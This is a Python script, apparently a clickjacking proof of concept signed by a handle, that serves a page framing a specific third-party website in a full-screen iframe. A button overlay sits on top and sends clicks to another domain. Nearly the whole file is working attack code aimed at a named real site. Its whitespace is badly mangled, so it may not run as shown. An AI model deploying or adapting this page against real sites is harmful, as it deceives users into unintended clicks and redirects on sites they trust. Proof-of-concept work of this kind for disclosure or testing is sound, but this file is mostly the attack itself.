from http.server import BaseHTTPRequestHandler, HTTPServer                                                                                                                                                                                  # HTML code for the clickjacking page
html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clickjacking Attack</title>
    <style>
        body {                                                                                                                    margin: 0;
            padding: 0;
            overflow: hidden;
        }
        iframe {
            position: absolute;                                                                                                   top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;                                                                                                         z-index: 1;
        }
        .overlay {                                                                                                                position: absolute;
            top: 0;                                                                                                               left: 0;
            width: 100%;
            height: 100%;                                                                                                         background: rgba(0, 0, 0, 0.5); /* semi-transparent background */
            z-index: 2;                                                                                                           display: flex;                                                                                                        align-items: center;
            justify-content: center;                                                                                          }
        .message {
            color: white;
            font-size: 24px;
            text-align: center;
        }                                                                                                                     .button-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);                                                                                     z-index: 3;
        }
        .button-container button {
            padding: 10px 20px;                                                                                                   font-size: 18px;
            cursor: pointer;
        }
    </style>
</head>
<body>                                                                                                                    <iframe src="https://www.getrushapp.com/"></iframe>
    <div class="overlay">
        <div class="button-container">
            <button onclick="redirect()">Click Me!</button>                                                                   </div>                                                                                                            </div>
    <div class="message" id="message" style="display:none;">You have been clickjacked by DeadmanXXXII</div>
    <script>
        function redirect() {                                                                                                     window.location.href = 'https://the-mad-hatters-playground.com/';
        }                                                                                                                 </script>
</body>
</html>
"""

# HTTP request handler class
class RequestHandler(BaseHTTPRequestHandler):                                                                             # Handle GET requests
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()                                                                                                    self.wfile.write(html_code.encode())

# Function to start the server
def start_server():                                                                                                       server_address = ('0.0.0.0', 8000)
    httpd = HTTPServer(server_address, RequestHandler)                                                                    print('Server started on http://0.0.0.0:8000')
    httpd.serve_forever()                                                                                                                                                                                                                   if __name__ == "__main__":                                                                                                start_server()
